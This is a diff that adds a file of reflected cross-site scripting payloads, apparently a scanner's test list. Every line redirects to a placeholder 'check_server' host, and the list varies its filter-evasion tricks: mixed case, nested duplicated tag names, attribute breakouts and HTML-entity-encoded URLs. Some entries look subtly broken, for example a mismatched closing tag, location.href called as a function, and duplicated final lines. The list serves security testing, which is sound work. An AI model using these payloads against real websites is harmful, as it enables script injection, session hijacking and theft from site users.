@@ -1,0 +1,56 @@
+<script>location.href="http://check_server/Reflected_XSS_Success"</script>
+<sCrIpT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrIpT>
+<scrscriptipt>location.href="http://check_server/Reflected_XSS_Success"</scrscriptipt>
+<sCrScRiPtIpT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrScRiPtIpT>
+<a href="http://check_server/Reflected_XSS_Success"></a>
+<a hReF="http://check_server/Reflected_XSS_Success"></a>
+<a hrhrefef="http://check_server/Reflected_XSS_Success"></a>
+<a hRhReFeF="http://check_server/Reflected_XSS_Success"></a>
+<iMg sRc="#" onerror="location.href('http://check_server/Reflected_XSS_Success');">
+<img src="#" oNeRrOr="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+<img src="#" oneonerrorrror="location.href('http://check_server/Reflected_XSS_Success');">
+<iMg sRc="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+<svg src="#" onload=location.href="http://check_server/Reflected_XSS_Success">
+<sVg sRc="#" oNlOaD=lOcAtIoN.href="http://check_server/Reflected_XSS_Success">
+><script>location.href="http://check_server/Reflected_XSS_Success"</script>
+><sCrIpT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrIpT>
+><scrscriptipt>location.href="http://check_server/Reflected_XSS_Success"</scrscriptipt>
+><sCrsCrIpTipT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrScRiPtIpT>
+><a href="http://check_server/Reflected_XSS_Success"></a>
+><a hReF="http://check_server/Reflected_XSS_Success"></a>
+><a hrhrefef="http://check_server/Reflected_XSS_Success"></a>
+><a hRhReFeF="http://check_server/Reflected_XSS_Success"></a>
+><img src="#" onerror="location.href('http://check_server/Reflected_XSS_Success');">
+><img src="#" oNeRrOr="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+><img src="#" oneonerrorrror="location.href('http://check_server/Reflected_XSS_Success');">
+><img src="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+><svg src="#" onload=location.href="http://check_server/Reflected_XSS_Success">
+><sVg sRc="#" oNlOaD=lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success">
+<script>location.href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</script>
+<sCrIpT>lOcAtIoN.hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</sCrIpT>
+<scrscriptipt>location.href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</scrscriptipt>
+<sCrScRiPtIpT>lOcAtIoN.hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</sCrScRiPtIpT>
+<a href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+<a hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+<a hrhrefef="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+<a hRhReFeF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+<img src="#" onerror="location.href('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+<iMg sRc="#" oNeRroR="lOcAtIoN.hReF('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+<img src="#" oneonerrorrror="location.href('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+<iMg sRc="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+<svg src="#" onload=location.href="'&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;">
+<sVg sRc="#" oNlOaD=lOcAtIoN.hReF="'&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;">
+><script>location.href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</script>
+><sCrIpT>lOcAtIoN.hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</sCrIpT>
+><scrscriptipt>location.href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</scrscriptipt>
+><sCrScRiPtIpT>lOcAtIoN.hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"</sCrScRiPtIpT>
+><a href="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+><a hReF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+><a hrhrefef="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+><a hRhReFeF="&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;"></a>
+><img src="#" onerror="location.href('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+><iMg sRc="#" oNeRrOr="lOcAtIoN.hReF('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+><img src="#" oneonerrorrror="location.href('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+><iMg sRc="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+><img src="#" oneonerrorrror="location.href('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
+><iMg sRc="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;');">
